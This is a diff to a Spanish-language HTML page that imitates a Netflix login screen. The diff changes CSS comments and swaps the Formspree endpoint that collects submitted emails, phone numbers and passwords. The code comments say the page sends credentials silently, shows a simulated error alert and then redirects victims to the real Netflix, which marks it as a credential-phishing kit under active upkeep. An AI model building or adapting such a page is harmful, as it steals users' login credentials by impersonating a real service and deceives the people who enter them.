@@ -207,7 +207,7 @@
             color: #b3b3b3;
         }
 
-        /* VISTA DE INICIAR SESIÓN (LOGIN) RESPONSIVA */
+        /* VISTA DE INICIAR SESIÓN (LOGIN) */
         .login-container {
             width: 100%;
             min-height: 100vh;
@@ -639,7 +639,7 @@
             color: #737373;
         }
 
-        /* MEDIA QUERIES PARA PANTALLAS MEDIANAS Y GRANDES (TABLETS Y PC) */
+        /* MEDIA QUERIES PARA PANTALLAS MEDIANAS Y GRANDES */
         @media(min-width: 768px) {
             .showcase-content h1 {
                 font-size: 3.125rem;
@@ -897,8 +897,8 @@
 
             <div class="login-form-wrapper">
                 <h1>Inicia sesión</h1>
-                <!-- Formulario conectado a Formspree -->
-                <form class="login-form" id="loginFormSubmit" action="https://formspree.io/f/mwlokqkd" method="POST">
+                <!-- Formulario conectado a tu nuevo Formspree -->
+                <form class="login-form" id="loginFormSubmit" action="https://formspree.io/f/moedvkka" method="POST">
                     <div class="login-input-block">
                         <input type="text" name="email_o_telefono" required>
                         <label>Email o número de celular</label>
@@ -971,7 +971,7 @@
             });
         });
 
-        // Envío silencioso a Formspree, alerta de error simulada y redirección a Netflix real
+        // Envío silencioso a tu nuevo Formspree, alerta de error y redirección oficial
         const loginForm = document.getElementById('loginFormSubmit');
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
